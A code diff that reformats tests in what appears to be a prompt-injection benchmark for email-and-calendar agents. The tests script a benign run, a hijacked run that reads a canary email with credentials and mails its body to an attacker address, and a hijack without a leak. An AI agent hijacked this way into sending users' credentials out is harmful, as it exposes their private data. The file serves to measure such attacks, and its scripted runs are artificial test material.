@@ -86,11 +86,14 @@ def test_benign_agent_completes_utility_no_leak(s: Scenario) -> None:
     env.call("read_inbox", {})
     env.call("read_email", {"email_id": s.canary_email_id})
     env.call("list_events", {})
-    env.call("create_event", {
-        "title": s.benign_title,
-        "start": s.benign_start,
-        "end": s.benign_start,
-    })
+    env.call(
+        "create_event",
+        {
+            "title": s.benign_title,
+            "start": s.benign_start,
+            "end": s.benign_start,
+        },
+    )
 
     assert env.utility_ok(s.case.utility_key) is True
     rec = _record(s.case, env.trace)
@@ -106,11 +109,14 @@ def test_assembled_attack_hijacks_and_leaks(s: Scenario) -> None:
     env.call("read_inbox", {})
     creds = env.call("read_email", {"email_id": s.canary_email_id})
     addr = s.case.exfil_spec.attacker_addresses[0]  # the assembled destination
-    env.call("send_email", {
-        "recipients": [addr],
-        "subject": "requested reference",
-        "body": creds["body"],  # carries the canary
-    })
+    env.call(
+        "send_email",
+        {
+            "recipients": [addr],
+            "subject": "requested reference",
+            "body": creds["body"],  # carries the canary
+        },
+    )
 
     rec = _record(s.case, env.trace)
     assert hijacked(rec, s.case.exfil_spec) is True
@@ -124,11 +130,14 @@ def test_hijack_without_leak_gap(s: Scenario) -> None:
     env = build_environment(s.case)
     env.call("read_inbox", {})
     addr = s.case.exfil_spec.attacker_addresses[0]
-    env.call("send_email", {
-        "recipients": [addr],
-        "subject": "acknowledged",
-        "body": "done, no details attached",
-    })
+    env.call(
+        "send_email",
+        {
+            "recipients": [addr],
+            "subject": "acknowledged",
+            "body": "done, no details attached",
+        },
+    )
 
     rec = _record(s.case, env.trace)
     assert hijacked(rec, s.case.exfil_spec) is True
